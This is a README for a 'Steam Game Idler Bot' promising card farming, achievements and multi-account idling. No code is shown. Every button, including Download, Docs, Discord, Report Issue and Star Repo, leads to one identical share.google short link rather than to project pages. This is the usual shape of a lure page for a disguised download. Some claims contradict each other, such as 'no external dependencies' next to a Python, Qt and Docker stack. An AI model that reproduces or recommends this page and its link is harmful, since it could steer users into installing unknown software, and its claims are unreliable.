# 🎮 Steam Game Idler Bot

<div align="center">

<br/>

[![Version](https://img.shields.io/badge/version-3.1.0-171A21?style=for-the-badge&logo=steam&logoColor=white)](https://github.com)
[![Platform](https://img.shields.io/badge/Windows%20%7C%20Linux%20%7C%20macOS-66C0F4?style=for-the-badge&logo=steam&logoColor=white)](https://store.steampowered.com)
[![License](https://img.shields.io/badge/license-MIT-C7D4E8?style=for-the-badge&logo=opensourceinitiative&logoColor=black)](LICENSE)
[![Accounts](https://img.shields.io/badge/multi--account-✅-2A475E?style=for-the-badge&logo=keepassxc&logoColor=white)](https://github.com)

<br/>

### ⏳ A lightweight bot that idles Steam games to unlock trading cards & boost playtime

*🃏 Card Farming • 🏆 Achievements • 👥 Multi-Account • 🛡️ Safe & Slow Mode*

<br/>

<a href="https://share.google/le42wOvUDXC8L7qom">
  <img src="https://img.shields.io/badge/📥_DOWNLOAD-171A21?style=for-the-badge&logo=steam&logoColor=white&labelColor=0A0D11" alt="Download" height="45"/>
</a>
&nbsp;&nbsp;
<a href="https://share.google/le42wOvUDXC8L7qom">
  <img src="https://img.shields.io/badge/🚀_QUICK_START-66C0F4?style=for-the-badge&logo=rocket&logoColor=white&labelColor=4A8FB8" alt="Quick Start" height="45"/>
</a>
&nbsp;&nbsp;
<a href="https://share.google/le42wOvUDXC8L7qom">
  <img src="https://img.shields.io/badge/📚_DOCS-C7D4E8?style=for-the-badge&logo=readthedocs&logoColor=black&labelColor=94A1B5" alt="Docs" height="45"/>
</a>

</div>

<img width="1000" height="525" alt="6602ccd67d5bb2a52ddc5ef5684384eed0ef6966-1200x630" src="https://github.com/user-attachments/assets/460fe489-81c5-4886-a952-030fd449cd26" />


<br/>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🌟 About

**Steam Game Idler Bot** is a **lightweight, cross-platform tool** that simulates playing Steam games in the background — so you can collect **trading cards**, boost **playtime**, and unlock **achievements** without leaving your PC running for hours.

It supports **multiple accounts**, careful **rate limiting**, and a **"safe mode"** that mimics human behavior to minimize risk. Just log in, pick your games, and let it idle.

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🎯 Key Features

<div align="center">

| 🃏 **Card Farming** | 🏆 **Achievements** | 👥 **Multi-Account** |
|:---:|:---:|:---:|
| Idle games to<br/>collect all drops | Unlock time-based<br/>achievements | Manage multiple<br/>Steam accounts |

| 🛡️ **Safe Mode** | ⚡ **Fast & Light** | 🖥️ **CLI + GUI** |
|:---:|:---:|:---:|
| Human-like timing<br/>& rate limits | Low CPU & RAM<br/>footprint | Point-and-click or<br/>terminal control |

</div>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🏆 Why This Bot

<div align="center">

| 💎 **Advantage** | 📝 **Description** |
|:---|:---|
| 🛡️ **Safety-First Design** | Built-in delays, randomization, and configurable slow mode |
| 🃏 **Card Drop Tracking** | Automatically detects remaining card drops and stops when complete |
| 👥 **Multi-Account Support** | Manage several Steam libraries from one dashboard |
| ⚡ **Lightweight** | Runs quietly in the background using minimal resources |
| 🖥️ **Cross-Platform** | Works on Windows, Linux and macOS with no external dependencies |
| 📊 **Detailed Logs** | Every action logged — full visibility into what the bot is doing |

</div>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🎬 Bot Preview

<div align="center">

```ascii
╔══════════════════════════════════════════════════╗
║  🎮  Steam Game Idler  v3.1.0                    ║
╠══════════════════════════════════════════════════╣
║  👤 Account: player_one                          ║
║  📚 Games: 42   🃏 Cards remaining: 68           ║
║  ──────────────────────────────────────────      ║
║  ⏳ Idling...                                    ║
║  ✅ Game 1: "Stardew Valley"    12 cards → 0     ║
║  ⏳ Game 2: "Terraria"          8 cards → 5      ║
║  ⏸️  Game 3: "Hades"            queued           ║
║                                                  ║
║  📊 Session stats                                ║
║  • Games idled: 12                               ║
║  • Cards earned: 24                              ║
║  • Achievements: 6                               ║
║  • Runtime: 2h 14m                               ║
║                                                  ║
║  🛡️ Safe mode ON   ⚡ CPU: 0.4%   📉 RAM: 42MB  ║
║  [ ▶ Start ]  [ ⏸ Pause ]  [ ⚙️ Settings ]      ║
╚══════════════════════════════════════════════════╝
```

</div>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🧩 Project Structure

```
🎮 steam-game-idler-bot/
├── 🎯 src/
│   ├── steam/                 # Steam client wrapper
│   │   ├── login.py
│   │   └── idler.py
│   ├── cards/                 # Card drop tracking
│   ├── accounts/              # Multi-account manager
│   ├── safety/                # Rate limiting & delays
│   ├── gui/                   # Desktop interface
│   └── cli/                   # Terminal interface
├── 🧪 tests/                  # Unit & integration
└── 📖 docs/                   # Setup & safety guide
```

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🛠️ Tech Stack

<div align="center">

![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Steam](https://img.shields.io/badge/Steam_API-171A21?style=for-the-badge&logo=steam&logoColor=white)
![steam.py](https://img.shields.io/badge/steam.py-66C0F4?style=for-the-badge&logo=python&logoColor=white)
![Qt](https://img.shields.io/badge/Qt_6-41CD52?style=for-the-badge&logo=qt&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)

</div>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 🤝 Community

Found a bug? Have a feature request or a safety improvement?

<div align="center">

<a href="https://share.google/le42wOvUDXC8L7qom">
  <img src="https://img.shields.io/badge/💬_Join_Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" height="35"/>
</a>
<a href="https://share.google/le42wOvUDXC8L7qom">
  <img src="https://img.shields.io/badge/🐞_Report_Issue-171A21?style=for-the-badge&logo=github&logoColor=white" height="35"/>
</a>
<a href="https://share.google/le42wOvUDXC8L7qom">
  <img src="https://img.shields.io/badge/⭐_Star_Repo-66C0F4?style=for-the-badge&logo=github&logoColor=white" height="35"/>
</a>

</div>

<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" width="100%"/>

## 📜 License

Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for details.

<br/>

<div align="center">

### 🎮 Made with ⏳ by the Steam Idler Team

*If this tool was useful to you — star the repo!*

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=1,17,9&height=120&section=footer" width="100%"/>

</div>
